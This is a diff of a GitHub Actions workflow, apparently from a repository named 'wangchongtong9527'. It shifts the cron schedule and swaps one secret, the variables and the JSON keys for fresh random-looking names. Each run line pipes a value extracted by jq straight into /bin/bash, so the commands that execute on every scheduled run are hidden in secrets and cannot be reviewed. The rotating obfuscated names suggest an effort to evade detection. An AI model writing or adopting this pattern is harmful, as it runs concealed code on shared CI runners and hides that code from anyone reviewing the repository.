@@ -1,23 +1,22 @@
 name: wangchongtong9527
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
+    - cron: '47 2/6 * * *'
 
-jobs:  # 7284
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wangchongtong9527
         env:
-          ly381: ${{ secrets.ly381 }}
+          efuxg103: ${{ secrets.efuxg103 }}
         run: |
-          echo $ly381 | jq -r .kdmrf5 | /bin/bash
-          echo $j09759 | jq -r .c3 | /bin/bash
-          echo $w7615 | jq -r .po5913 | /bin/bash
-          echo $i591 | jq -r .rq02 | /bin/bash
-          echo $nsbbo6904 | jq -r .osl20 | /bin/bash
-          echo $yehau01574 | jq -r .i9134 | /bin/bash
+          echo $efuxg103 | jq -r .vzq1 | /bin/bash
+          echo $k3 | jq -r .rur394 | /bin/bash
+          echo $jxccg05 | jq -r .q08 | /bin/bash
+          echo $mi3120 | jq -r .ym5 | /bin/bash
+          echo $hdkmw3953 | jq -r .aauj1 | /bin/bash
+          echo $bxz14098 | jq -r .r590 | /bin/bash
 
